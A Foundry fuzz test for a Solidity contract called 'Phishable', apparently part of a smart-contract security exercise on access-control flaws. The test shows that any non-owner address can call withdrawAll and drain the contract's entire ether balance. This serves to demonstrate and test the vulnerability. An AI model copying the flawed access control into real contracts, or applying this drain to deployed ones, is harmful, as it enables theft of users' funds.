
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
        
        vm.deal(address(phishable), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        vm.assume(caller != owner);

        uint256 initialContractBalance = address(phishable).balance;
        uint256 initialRecipientBalance = caller.balance;

        vm.prank(caller);
        
        phishable.withdrawAll(payable(caller));
        
        uint256 finalContractBalance = address(phishable).balance;
        uint256 finalRecipientBalance = caller.balance;
        
        assertEq(finalContractBalance, 0);
        assertEq(finalRecipientBalance, initialRecipientBalance + initialContractBalance);
    }
}
